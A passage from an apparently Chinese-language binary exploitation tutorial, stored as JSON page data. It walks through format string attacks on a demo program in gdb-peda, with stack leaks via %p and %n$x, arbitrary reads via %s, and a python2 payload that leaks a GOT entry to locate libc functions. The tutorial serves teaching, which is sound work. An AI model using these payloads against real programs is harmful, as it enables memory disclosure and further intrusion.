--&gt; 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\")\n0004| 0xffffd554 --&gt; 0x1\n0008| 0xffffd558 --&gt; 0x88888888\n0012| 0xffffd55c --&gt; 0xffffffff\n0016| 0xffffd560 --&gt; 0xffffd57a (\"ABCD\")\n0020| 0xffffd564 --&gt; 0xffffd584 (\"%08x.%08x.%08x.%08x.%08x\")\n0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\")\n0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x56555642 in main ()\ngdb-peda$ x/10x $esp\n0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff\n0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7\n0xffffd570:     0xf7ffda54      0x00000001\ngdb-peda$ c\nContinuing.\n00000001.88888888.ffffffff.ffffd57a.ffffd584\n</code></pre> <p>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 <code>0xffffd584</code> \u7684\u5730\u5740\u51fa\u73b0\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u6070\u597d\u4f4d\u4e8e\u53c2\u6570 <code>arg1</code>\u3001<code>arg2</code>\u3001<code>arg3</code>\u3001<code>arg4</code> \u4e4b\u524d\u3002\u683c\u5f0f\u5b57\u7b26\u4e32 <code>%08x.%08x.%08x.%08x.%08x</code> \u8868\u793a\u51fd\u6570 <code>printf()</code> \u4ece\u6808\u4e2d\u53d6\u51fa 5 \u4e2a\u53c2\u6570\u5e76\u5c06\u5b83\u4eec\u4ee5 8 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\u7684\u5f62\u5f0f\u663e\u793a\u51fa\u6765\u3002\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u4f7f\u7528\u4e00\u4e2a\u5185\u90e8\u53d8\u91cf\u6765\u6807\u5fd7\u4e0b\u4e00\u4e2a\u53c2\u6570\u7684\u4f4d\u7f6e\u3002\u5f00\u59cb\u65f6\uff0c\u53c2\u6570\u6307\u9488\u6307\u5411\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08<code>arg1</code>\uff09\u3002\u968f\u7740\u6bcf\u4e00\u4e2a\u53c2\u6570\u88ab\u76f8\u5e94\u7684\u683c\u5f0f\u89c4\u8303\u6240\u8017\u7528\uff0c\u53c2\u6570\u6307\u9488\u7684\u503c\u4e5f\u6839\u636e\u53c2\u6570\u7684\u957f\u5ea6\u4e0d\u65ad\u9012\u589e\u3002\u5728\u663e\u793a\u5b8c\u5f53\u524d\u6267\u884c\u51fd\u6570\u7684\u5269\u4f59\u81ea\u52a8\u53d8\u91cf\u4e4b\u540e\uff0c<code>printf()</code> \u5c06\u663e\u793a\u5f53\u524d\u6267\u884c\u51fd\u6570\u7684\u6808\u5e27\uff08\u5305\u62ec\u8fd4\u56de\u5730\u5740\u548c\u53c2\u6570\u7b49\uff09\u3002</p> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>%p.%p.%p.%p.%p</code> \u5f97\u5230\u76f8\u4f3c\u7684\u7ed3\u679c\u3002</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd584 (\"%p.%p.%p.%p.%p\")\nEBX: 0x56557000 --&gt; 0x1efc\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd618 --&gt; 0x0\nESP: 0xffffd550 --&gt; 0xffffd584 (\"%p.%p.%p.%p.%p\")\nEIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]\n   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]\n   0x56555641 &lt;main+132&gt;:       push   eax\n=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;\n   0x56555647 &lt;main+138&gt;:       add    esp,0x20\n   0x5655564a &lt;main+141&gt;:       sub    esp,0xc\n   0x5655564d &lt;main+144&gt;:       push   0xa\n   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;\nGuessed arguments:\narg[0]: 0xffffd584 (\"%p.%p.%p.%p.%p\")\narg[1]: 0x1\narg[2]: 0x88888888\narg[3]: 0xffffffff\narg[4]: 0xffffd57a (\"ABCD\")\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd550 --&gt; 0xffffd584 (\"%p.%p.%p.%p.%p\")\n0004| 0xffffd554 --&gt; 0x1\n0008| 0xffffd558 --&gt; 0x88888888\n0012| 0xffffd55c --&gt; 0xffffffff\n0016| 0xffffd560 --&gt; 0xffffd57a (\"ABCD\")\n0020| 0xffffd564 --&gt; 0xffffd584 (\"%p.%p.%p.%p.%p\")\n0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\")\n0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x56555642 in main ()\ngdb-peda$ c\nContinuing.\n0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584\n</code></pre> <p>\u4e0a\u9762\u7684\u65b9\u6cd5\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u53c2\u6570\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u76f4\u63a5\u83b7\u5f97\u88ab\u6307\u5b9a\u7684\u67d0\u4e2a\u53c2\u6570\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e0b\u9762\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\uff1a</p> <pre><code>%&lt;arg#&gt;$&lt;format&gt;\n\n%n$x\n</code></pre> <p>\u8fd9\u91cc\u7684 <code>n</code> \u8868\u793a\u6808\u4e2d\u683c\u5f0f\u5b57\u7b26\u4e32\u540e\u9762\u7684\u7b2c <code>n</code> \u4e2a\u503c\u3002</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\")\nEBX: 0x56557000 --&gt; 0x1efc\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd618 --&gt; 0x0\nESP: 0xffffd550 --&gt; 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\")\nEIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]\n   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]\n   0x56555641 &lt;main+132&gt;:       push   eax\n=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;\n   0x56555647 &lt;main+138&gt;:       add    esp,0x20\n   0x5655564a &lt;main+141&gt;:       sub    esp,0xc\n   0x5655564d &lt;main+144&gt;:       push   0xa\n   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;\nGuessed arguments:\narg[0]: 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\")\narg[1]: 0x1\narg[2]: 0x88888888\narg[3]: 0xffffffff\narg[4]: 0xffffd57a (\"ABCD\")\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd550 --&gt; 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\")\n0004| 0xffffd554 --&gt; 0x1\n0008| 0xffffd558 --&gt; 0x88888888\n0012| 0xffffd55c --&gt; 0xffffffff\n0016| 0xffffd560 --&gt; 0xffffd57a (\"ABCD\")\n0020| 0xffffd564 --&gt; 0xffffd584 (\"%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p\")\n0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\")\n0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x56555642 in main ()\ngdb-peda$ x/10w $esp\n0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff\n0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7\n0xffffd570:     0xf7ffda54      0x00000001\ngdb-peda$ c\nContinuing.\nffffffff.00000001.0x88888888.0x88888888.0xffffd57a.0xffffd584.0x56555220\n</code></pre> <p>\u8fd9\u91cc\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5730\u5740\u4e3a <code>0xffffd584</code>\u3002\u6211\u4eec\u901a\u8fc7\u683c\u5f0f\u5b57\u7b26\u4e32 <code>%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p</code> \u5206\u522b\u83b7\u53d6\u4e86 <code>arg3</code>\u3001<code>arg1</code>\u3001\u4e24\u4e2a <code>arg2</code>\u3001<code>arg4</code> \u548c\u6808\u4e0a\u7d27\u8ddf\u53c2\u6570\u7684\u4e24\u4e2a\u503c\u3002\u53ef\u4ee5\u770b\u5230\u8fd9\u79cd\u65b9\u6cd5\u975e\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u83b7\u5f97\u6808\u4e2d\u4efb\u610f\u7684\u503c\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_10","title":"\u67e5\u770b\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u201c\u663e\u793a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u201d\u7684\u683c\u5f0f\u89c4\u8303\u6765\u67e5\u770b\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 <code>%s</code> \u663e\u793a\u53c2\u6570\u3000\u6307\u9488\u6240\u6307\u5b9a\u7684\u5730\u5740\u7684\u5185\u5b58\uff0c\u5c06\u5b83\u4f5c\u4e3a\u4e00\u4e2a ASCII \u5b57\u7b26\u4e32\u5904\u7406\uff0c\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u64cd\u7eb5\u8fd9\u4e2a\u53c2\u6570\u6307\u9488\u6307\u5411\u4e00\u4e2a\u7279\u5b9a\u7684\u5730\u5740\uff0c\u90a3\u4e48 <code>%s</code> \u5c31\u4f1a\u8f93\u51fa\u8be5\u4f4d\u7f6e\u7684\u5185\u5b58\u5185\u5bb9\u3002</p> <p>\u8fd8\u662f\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u8f93\u5165 <code>%4$s</code>\uff0c\u8f93\u51fa\u7684 <code>arg4</code> \u5c31\u53d8\u6210\u4e86 <code>ABCD</code> \u800c\u4e0d\u662f\u5730\u5740 <code>0xffffd57a</code>\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd584 (\"%4$s\")\nEBX: 0x56557000 --&gt; 0x1efc\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd618 --&gt; 0x0\nESP: 0xffffd550 --&gt; 0xffffd584 (\"%4$s\")\nEIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]\n   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]\n   0x56555641 &lt;main+132&gt;:       push   eax\n=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;\n   0x56555647 &lt;main+138&gt;:       add    esp,0x20\n   0x5655564a &lt;main+141&gt;:       sub    esp,0xc\n   0x5655564d &lt;main+144&gt;:       push   0xa\n   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;\nGuessed arguments:\narg[0]: 0xffffd584 (\"%4$s\")\narg[1]: 0x1\narg[2]: 0x88888888\narg[3]: 0xffffffff\narg[4]: 0xffffd57a (\"ABCD\")\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd550 --&gt; 0xffffd584 (\"%4$s\")\n0004| 0xffffd554 --&gt; 0x1\n0008| 0xffffd558 --&gt; 0x88888888\n0012| 0xffffd55c --&gt; 0xffffffff\n0016| 0xffffd560 --&gt; 0xffffd57a (\"ABCD\")\n0020| 0xffffd564 --&gt; 0xffffd584 (\"%4$s\")\n0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\")\n0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x56555642 in main ()\ngdb-peda$ c\nContinuing.\nABCD\n</code></pre> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u80fd\u8bfb\u53d6\u6808\u4e2d\u5df2\u6709\u7684\u5185\u5bb9\uff0c\u5982\u679c\u6211\u4eec\u60f3\u83b7\u53d6\u7684\u662f\u4efb\u610f\u7684\u5730\u5740\u7684\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u6211\u4eec\u81ea\u5df1\u5c06\u5730\u5740\u5199\u5165\u5230\u6808\u4e2d\u3002\u6211\u4eec\u8f93\u5165 <code>AAAA.%p</code> \u8fd9\u6837\u7684\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u89c2\u5bdf\u4e00\u4e0b\u6808\u6709\u4ec0\u4e48\u53d8\u5316\u3002</p> <pre><code>gdb-peda$ python print(\"AAAA\"+\".%p\"*20)\nAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n...\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\")\nEBX: 0x56557000 --&gt; 0x1efc\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd618 --&gt; 0x0\nESP: 0xffffd550 --&gt; 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\")\nEIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]\n   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]\n   0x56555641 &lt;main+132&gt;:       push   eax\n=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;\n   0x56555647 &lt;main+138&gt;:       add    esp,0x20\n   0x5655564a &lt;main+141&gt;:       sub    esp,0xc\n   0x5655564d &lt;main+144&gt;:       push   0xa\n   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;\nGuessed arguments:\narg[0]: 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\")\narg[1]: 0x1\narg[2]: 0x88888888\narg[3]: 0xffffffff\narg[4]: 0xffffd57a (\"ABCD\")\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd550 --&gt; 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\")\n0004| 0xffffd554 --&gt; 0x1\n0008| 0xffffd558 --&gt; 0x88888888\n0012| 0xffffd55c --&gt; 0xffffffff\n0016| 0xffffd560 --&gt; 0xffffd57a (\"ABCD\")\n0020| 0xffffd564 --&gt; 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\")\n0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\")\n0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x56555642 in main ()\n</code></pre> <p>\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5728 <code>0xffffd584</code>\uff0c\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\u5b83\u4eec\u5728\u6808\u4e2d\u662f\u600e\u6837\u6392\u5e03\u7684\uff1a</p> <pre><code>gdb-peda$ x/20w $esp\n0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff\n0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7\n0xffffd570:     0xf7ffda54      0x00000001      0x424135d0      0x00004443\n0xffffd580:     0x00000000      0x41414141      0x2e70252e      0x252e7025\n0xffffd590:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70\ngdb-peda$ x/20wb 0xffffd584\n0xffffd584:     0x41    0x41    0x41    0x41    0x2e    0x25    0x70    0x2e\n0xffffd58c:     0x25    0x70    0x2e    0x25    0x70    0x2e    0x25    0x70\n0xffffd594:     0x2e    0x25    0x70    0x2e\ngdb-peda$ python print('\\x2e\\x25\\x70')\n.%p\n</code></pre> <p>\u4e0b\u9762\u662f\u7a0b\u5e8f\u8fd0\u884c\u7684\u7ed3\u679c\uff1a</p> <pre><code>gdb-peda$ c\nContinuing.\nAAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e\n</code></pre> <p><code>0x41414141</code> \u662f\u8f93\u51fa\u7684\u7b2c 13 \u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u6211\u4eec\u4f7f\u7528 <code>%13$s</code> \u5373\u53ef\u8bfb\u51fa <code>0x41414141</code> \u5904\u7684\u5185\u5bb9\uff0c\u5f53\u7136\uff0c\u8fd9\u91cc\u53ef\u80fd\u662f\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u5730\u5740\u3002\u4e0b\u9762\u6211\u4eec\u628a <code>0x41414141</code> \u6362\u6210\u6211\u4eec\u9700\u8981\u7684\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32 <code>ABCD</code> \u7684\u5730\u5740 <code>0xffffd57a</code>\uff1a</p> <pre><code>$ python2 -c 'print(\"\\x7a\\xd5\\xff\\xff\"+\".%13$s\")' &gt; text\n$ gdb -q a.out\nReading symbols from a.out...(no debugging symbols found)...done.\ngdb-peda$ b printf\nBreakpoint 1 at 0x8048350\ngdb-peda$ r &lt; text\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd584 --&gt; 0xffffd57a (\"ABCD\")\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd618 --&gt; 0x0\nESP: 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)\nEIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7e27c1b &lt;fprintf+27&gt;:     ret\n   0xf7e27c1c:  xchg   ax,ax\n   0xf7e27c1e:  xchg   ax,ax\n=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;\n   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243\n   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc\n   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]\n   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\n0004| 0xffffd550 --&gt; 0xffffd584 --&gt; 0xffffd57a (\"ABCD\")\n0008| 0xffffd554 --&gt; 0x1\n0012| 0xffffd558 --&gt; 0x88888888\n0016| 0xffffd55c --&gt; 0xffffffff\n0020| 0xffffd560 --&gt; 0xffffd57a (\"ABCD\")\n0024| 0xffffd564 --&gt; 0xffffd584 --&gt; 0xffffd57a (\"ABCD\")\n0028| 0xffffd568 --&gt; 0x80481fc --&gt; 0x38 ('8')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6\ngdb-peda$ x/20w $esp\n0xffffd54c:     0x08048520      0xffffd584      0x00000001      0x88888888\n0xffffd55c:     0xffffffff      0xffffd57a      0xffffd584      0x080481fc\n0xffffd56c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0\n0xffffd57c:     0x00004443      0x00000000      0xffffd57a      0x3331252e\n0xffffd58c:     0x00007324      0xffffd5ca      0x00000001      0x000000c2\ngdb-peda$ x/s 0xffffd57a\n0xffffd57a:     \"ABCD\"\ngdb-peda$ c\nContinuing.\nz\ufffd\ufffd\ufffd.ABCD\n</code></pre> <p>\u5f53\u7136\u8fd9\u4e5f\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u6211\u4eec\u771f\u6b63\u7ecf\u5e38\u7528\u5230\u7684\u5730\u65b9\u662f\uff0c\u628a\u7a0b\u5e8f\u4e2d\u67d0\u51fd\u6570\u7684 GOT \u5730\u5740\u4f20\u8fdb\u53bb\uff0c\u7136\u540e\u83b7\u5f97\u8be5\u5730\u5740\u6240\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u865a\u62df\u5730\u5740\u3002\u7136\u540e\u6839\u636e\u51fd\u6570\u5728 libc \u4e2d\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u8ba1\u7b97\u51fa\u6211\u4eec\u9700\u8981\u7684\u51fd\u6570\u5730\u5740\uff08\u5982 <code>system()</code>\uff09\u3002\u5982\u4e0b\u9762\u5c55\u793a\u7684\u8fd9\u6837\uff1a</p> <p>\u5148\u770b\u4e00\u4e0b\u91cd\u5b9a\u5411\u8868\uff1a</p> <pre><code>$ readelf -r a.out\n\nRelocation section '.rel.dyn' at offset 0x2e8 contains 1 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__\n\nRelocation section '.rel.plt' at offset 0x2f0 contains 4 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0\n0804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0\n0804a014  00000407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0\n0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7\n</code></pre> <p><code>.rel.plt</code> \u4e2d\u6709\u56db\u4e2a\u51fd\u6570\u53ef\u4f9b\u6211\u4eec\u9009\u62e9\uff0c\u6309\u7406\u8bf4\u9009\u62e9\u4efb\u610f\u4e00\u4e2a\u90fd\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u662f\u5728\u5b9e\u8df5\u4e2d\u6211\u4eec\u4f1a\u53d1\u73b0\u4e00\u4e9b\u95ee\u9898\u3002\u4e0b\u9762\u7684\u7ed3\u679c\u5206\u522b\u662f <code>printf</code>\u3001<code>__libc_start_main</code>\u3001<code>putchar</code> \u548c <code>__isoc99_scanf</code>\uff1a</p> <pre><code>$ python2 -c 'print(\"\\x0c\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out\n.0x1.0x88888888.0xffffffff.0xffe22cfa.0xffe22d04.0x80481fc.0x80484b0.0xf77afa54.0x1.0x424155d0.0x4443.(nil).0x2e0804a0.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025\n$ python2 -c 'print(\"\\x10\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out\n.0x1.0x88888888.0xffffffff.0xffd439ba.0xffd439c4.0x80481fc.0x80484b0.0xf77b6a54.0x1.0x4241c5d0.0x4443.(nil).0x804a010.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e\n$ python2 -c 'print(\"\\x14\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out\n.0x1.0x88888888.0xffffffff.0xffcc17aa.0xffcc17b4.0x80481fc.0x80484b0.0xf7746a54.0x1.0x4241c5d0.0x4443.(nil).0x804a014.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e\n$ python2 -c 'print(\"\\x18\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out\n\u2592.0x1.0x88888888.0xffffffff.0xffcb99aa.0xffcb99b4.0x80481fc.0x80484b0.0xf775ca54.0x1.0x424125d0.0x4443.(nil).0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e\n</code></pre> <p>\u7ec6\u5fc3\u4e00\u70b9\u4f60\u5c31\u4f1a\u53d1\u73b0\u7b2c\u4e00\u4e2a\uff08<code>printf</code>\uff09\u7684\u7ed3\u679c\u6709\u95ee\u9898\u3002\u6211\u4eec\u8f93\u5165\u4e86 <code>\\x0c\\xa0\\x04\\x08</code>\uff08<code>0x0804a00c</code>\uff09\uff0c\u53ef\u662f 13 \u53f7\u4f4d\u7f6e\u8f93\u51fa\u7684\u7ed3\u679c\u5374\u662f <code>0x2e0804a0</code>\uff0c\u90a3\u4e48\uff0c<code>\\x0c</code> \u54ea\u53bb\u4e86\uff0c\u67e5\u4e86\u4e00\u4e0b ASCII \u8868\uff1a</p> <pre><code>Oct   Dec   Hex   Char\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n014   12    0C    FF  '\\f' (form feed)\n</code></pre> <p>\u4e8e\u662f\u5c31\u88ab\u7701\u7565\u4e86\uff0c\u540c\u6837\u4f1a\u88ab\u7701\u7565\u7684\u8fd8\u6709\u5f88\u591a\uff0c\u5982 <code>\\x07</code>\uff08'\\a'\uff09\u3001<code>\\x08</code>\uff08'\\b'\uff09\u3001<code>\\x20</code>\uff08SPACE\uff09\u7b49\u7684\u4e0d\u53ef\u89c1\u5b57\u7b26\u90fd\u4f1a\u88ab\u7701\u7565\u3002\u8fd9\u5c31\u4f1a\u8ba9\u6211\u4eec\u540e\u7eed\u7684\u64cd\u4f5c\u51fa\u73b0\u95ee\u9898\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u6700\u540e\u4e00\u4e2a\uff08<code>__isoc99_scanf</code>\uff09\u3002</p> <pre><code>$ python2 -c 'print(\"\\x18\\xa0\\x04\\x08\"+\"%13$s\")' &gt; text\n$ gdb -q a.out\nReading symbols from a.out...(no debugging symbols found)...done.\ngdb-peda$ b printf\nBreakpoint 1 at 0x8048350\ngdb-peda$ r &lt; text\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd618 --&gt; 0x0\nESP: 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)\nEIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7e27c1b &lt;fprintf+27&gt;:     ret\n   0xf7e27c1c:  xchg   ax,ax\n   0xf7e27c1e:  xchg   ax,ax\n=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;\n   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243\n   0xf7e27c2a 